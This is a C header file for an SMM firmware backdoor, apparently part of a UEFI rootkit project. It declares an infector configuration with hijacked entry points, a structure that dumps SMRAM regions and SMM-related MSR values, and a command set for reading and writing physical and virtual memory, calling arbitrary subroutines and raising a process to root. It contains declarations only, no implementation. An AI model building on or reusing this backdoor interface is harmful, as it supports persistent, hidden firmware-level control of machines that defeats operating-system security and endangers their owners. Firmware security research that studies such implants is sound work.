
#ifndef _SMM_BACKDOOR_H_
#define _SMM_BACKDOOR_H_

#define BACKDOOR_VAR_INFO_NAME L"SmmBackdoorInfo"

#define BACKDOOR_VAR_GUID { 0x3a452e85, 0xa7ca, 0x438f, \
                            { 0xa5, 0xcb, 0xad, 0x3a, 0x70, 0xc5, 0xd0, 0x1b }}

#pragma warning(disable: 4200)

#pragma pack(1)

// idicate that SMRAM regions were copied to BACKDOOR_INFO structure
#define BACKDOOR_INFO_FULL 0xffffffff

typedef struct _INFECTOR_CONFIG
{
    VOID *BackdoorEntryInfected;
    UINTN OriginalEntryPoint;
    VOID *BackdoorEntryExploit;

} INFECTOR_CONFIG,
*PINFECTOR_CONFIG;

typedef struct _BACKDOOR_INFO
{
    // number of SMI that was handled
    UINTN CallsCount;

    // number of timer handlr ticks
    UINTN TicksCount;

    // EFI_STATUS of last operation
    UINTN BackdoorStatus;

    // MSR_SMM_MCA_CAP register value
    UINT64 SmmMcaCap;

    // MSR_SMM_FEATURE_CONTROL register value
    UINT64 SmmFeatureControl;

    // List of structures with available SMRAM regions information.
    // Zero value of EFI_SMRAM_DESCRIPTOR.PhysicalStart means last item of list.
    EFI_SMRAM_DESCRIPTOR SmramMap[];

} BACKDOOR_INFO,
*PBACKDOOR_INFO;

#pragma pack()

// test for alive SMM backdoor
#define BACKDOOR_SW_DATA_PING               0

// read physical memory page command
#define BACKDOOR_SW_DATA_READ_PHYS_PAGE     1

// read virtual memory page command
#define BACKDOOR_SW_DATA_READ_VIRT_PAGE     2

// write physical memory page command
#define BACKDOOR_SW_DATA_WRITE_PHYS_PAGE    3

// write virtual memory page command
#define BACKDOOR_SW_DATA_WRITE_VIRT_PAGE    4

// enable periodic timer handler
#define BACKDOOR_SW_DATA_TIMER_ENABLE       5

// disable periodic timer handler
#define BACKDOOR_SW_DATA_TIMER_DISABLE      6

// call specified subroutine
#define BACKDOOR_SW_DATA_CALL               7

// set uid/gid/euid/egid of current process to 0
#define BACKDOOR_SW_DATA_PRIVESC            8

// read physical memory dowrd command
#define BACKDOOR_SW_DATA_READ_PHYS_DWORD    9

// read virtual memory dowrd command
#define BACKDOOR_SW_DATA_READ_VIRT_DWORD    10

// write physical memory dowrd command
#define BACKDOOR_SW_DATA_WRITE_PHYS_DWORD   11

// write virtual memory dowrd command
#define BACKDOOR_SW_DATA_WRITE_VIRT_DWORD   12

void SerialPrint(char *Message);

#endif
